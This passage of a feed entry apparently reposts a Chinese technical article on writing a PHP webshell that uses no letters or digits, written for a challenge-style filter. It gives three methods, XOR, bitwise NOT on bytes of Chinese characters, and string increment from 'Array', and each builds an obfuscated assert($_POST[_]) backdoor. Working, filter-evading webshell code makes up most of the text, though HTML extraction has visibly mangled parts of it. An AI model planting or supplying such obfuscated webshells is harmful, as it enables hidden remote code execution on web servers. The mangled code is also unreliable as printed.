将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html#_2" target="_blank" rel="noopener">方法一</a></h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$&#x3D;(&#39;%01&#39;^&#39;&#39;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;p&quot;&gt;)&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;o&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;p&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;s1&quot;&gt;&#39;%13&#39;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;o&quot;&gt;^&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;s1&quot;&gt;&#39;&#39;).(&#39;%13&#39;^&#39;&#39;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;p&quot;&gt;)&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;o&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;p&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;s1&quot;&gt;&#39;%05&#39;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;o&quot;&gt;^&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;s1&quot;&gt;&#39;&#39;).(&#39;%12&#39;^&#39;&#39;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;p&quot;&gt;)&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;o&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;p&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;s1&quot;&gt;&#39;%14&#39;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;o&quot;&gt;^&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;s1&quot;&gt;&#39;&#39;); &#x2F;&#x2F; $&#x3D;&#39;assert&#39;;</span><br><span class="line">$&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); &#x2F;&#x2F; $&#x3D;&#39;POST&#39;;</span><br><span class="line">$__&#x3D;$$;</span><br><span class="line">$($[_]); &#x2F;&#x2F; assert($POST[]);</span><br></pre></td></tr></table></figure><br>执行结果如下：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.jpg" target="_blank" rel="noopener"><img src="/img/loading.gif" alt="14871921588272.jpg" class="lazyload" data-src="https://www.leavesongs.com/media/attachment/2017/02/17/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.6713f3c45766.jpg"></a></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html#_3" target="_blank" rel="noopener">方法二</a></h3><p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;{2}</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.jpg" target="_blank" rel="noopener"><img src="/img/loading.gif" alt="14872686600768.jpg" class="lazyload" data-src="https://www.leavesongs.com/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg"></a></p><p>利用这个特性，我找了一篇文章（ <a href="https://www.leavesongs.com/THINK/answer.html" target="_blank" rel="noopener">https://www.leavesongs.com/THINK/answer.html</a> ），自动选择了其中一些汉字，生成如下答案：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);</span><br><span class="line">$_&#x3D;$&#x2F;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;&#39;&#39;;</span><br><span class="line">$&#x3D;&quot;瞰&quot;;$_.&#x3D;~($&#123;$&#125;);$__&#x3D;&quot;和&quot;;$_.&#x3D;~($&#123;$&#125;);$_&#x3D;&quot;和&quot;;$_.&#x3D;~($&#123;$&#125;);$_&#x3D;&quot;的&quot;;$_.&#x3D;~($&#123;$&#125;);$__&#x3D;&quot;半&quot;;$_.&#x3D;~($&#123;$&#125;);$__&#x3D;&quot;始&quot;;$_.&#x3D;~($&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_&#x3D;&#39;&#39;;$__&#x3D;&quot;俯&quot;;$_.&#x3D;~($_&#123;$&#125;);$&#x3D;&quot;瞰&quot;;$__.&#x3D;~($_&#123;$&#125;);$&#x3D;&quot;次&quot;;$__.&#x3D;~($&#123;$&#125;);$_&#x3D;&quot;站&quot;;$_.&#x3D;~($__&#123;$&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$&#x3D;$$__;</span><br><span class="line">$_($[$]);</span><br></pre></td></tr></table></figure><br><a href="https://www.leavesongs.com/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.jpg" target="_blank" rel="noopener"><img src="/img/loading.gif" alt="14871906748025.jpg" class="lazyload" data-src="https://www.leavesongs.com/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg"></a></p><p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html#_4" target="_blank" rel="noopener">方法三</a></h3><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.increment.php</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg" target="_blank" rel="noopener"><img src="/img/loading.gif" alt="14872693882387.jpg" class="lazyload" data-src="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg"></a></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg" target="_blank" rel="noopener"><img src="/img/loading.gif" alt="14872697183159.jpg" class="lazyload" data-src="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg"></a></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$&#x3D;[];</span><br><span class="line">$&#x3D;@&quot;$&quot;; &#x2F;&#x2F; $&#x3D;&#39;Array&#39;;</span><br><span class="line">$&#x3D;$[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $&#x3D;$[0];</span><br><span class="line">$&#x3D;$; &#x2F;&#x2F; A</span><br><span class="line">$&#x3D;$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;</span><br><span class="line">$__.&#x3D;$; &#x2F;&#x2F; S</span><br><span class="line">$_.&#x3D;$; &#x2F;&#x2F; S</span><br><span class="line">$&#x3D;$;</span><br><span class="line">$++;$++;$++;$++; &#x2F;&#x2F; E </span><br><span class="line">$__.&#x3D;$;</span><br><span class="line">$&#x3D;$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; &#x2F;&#x2F; R</span><br><span class="line">$.&#x3D;$;</span><br><span class="line">$&#x3D;$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; &#x2F;&#x2F; T</span><br><span class="line">$.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;&#39;&#39;;</span><br><span class="line">$&#x3D;$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; &#x2F;&#x2F; P</span><br><span class="line">$__.&#x3D;$;</span><br><span class="line">$&#x3D;$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; &#x2F;&#x2F; O</span><br><span class="line">$__.&#x3D;$;</span><br><span class="line">$&#x3D;$_;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; &#x2F;&#x2F; S</span><br><span class="line">$__.&#x3D;$;</span><br><span class="line">$&#x3D;$_;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; &#x2F;&#x2F; T</span><br><span class="line">$__.&#x3D;$__;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$&#x3D;$$__;</span><br><span class="line">$($[]); &#x2F;&#x2F; ASSERT($POST[]);</span><br></pre></td></tr></table></figure><br>执行结果：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/d92e3d40-a451-4fc4-a516-e0747b721c69.jpg" target="_blank" rel="noopener"><img src="/img/loading.gif" alt="14872701052595.jpg" class="lazyload" data-src="https://www.leavesongs.com/media/attachment/2017/02/17/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg"></a><br>原文链接：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>]]></content>
    
    <summary type="html">
    
      p牛的经典文章
    
    </summary>
    
      <category term="技术文章" scheme="https://www.0x002.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="奇淫技巧" scheme="https://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="webshell" scheme="https://www.0x002.com/tags/webshell/"/>
    
  </entry>
  
</feed>
